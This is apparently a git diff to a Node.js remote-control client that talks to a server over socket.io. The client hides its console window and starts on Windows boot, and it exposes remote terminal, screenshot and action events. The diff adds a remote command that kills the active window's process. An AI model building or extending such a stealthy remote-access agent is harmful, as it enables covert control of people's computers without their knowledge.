@@ -1,3 +1,4 @@
+
 const si = require('systeminformation');
 const { io } = require("socket.io-client");
 const activeWindow = require('active-win');
@@ -25,7 +26,7 @@ platform = os.platform();
 console.log("IS Windows Runtime requirind dependencys") 
 var startOnBoot = require('start-on-windows-boot');
 const ConsoleWindow = require("node-hide-console-window");
-
+var ps = require('xps');
     
     ConsoleWindow.hideConsole();
 
@@ -238,6 +239,29 @@ main();
 })
 
 
+socket.on("close-active-win", async () => {
+
+
+  if(typeof(activeWindow) !== 'undefined')
+  {
+av = await activeWindow();
+  
+ps.kill(av.owner.processId).fork(
+
+function(error){ console.log("failed kill"); socket.emit("closewinresult", false, av.title)},
+function(){ console.log("réussi"); socket.emit("closewinresult", true, av.title) }
+)
+
+}else{
+
+
+  }
+
+
+
+
+})
+
 
 socket.on("open-on-client", (type, value, args) => {
 
@@ -341,4 +365,6 @@ socket.removeListener("computer-action")
 socket.removeListener("xterm-input")
 socket.removeListener("screenshot-desktop")
 socket.removeListener("disconnect")
+socket.removeListener("close-active-win")
+
 }
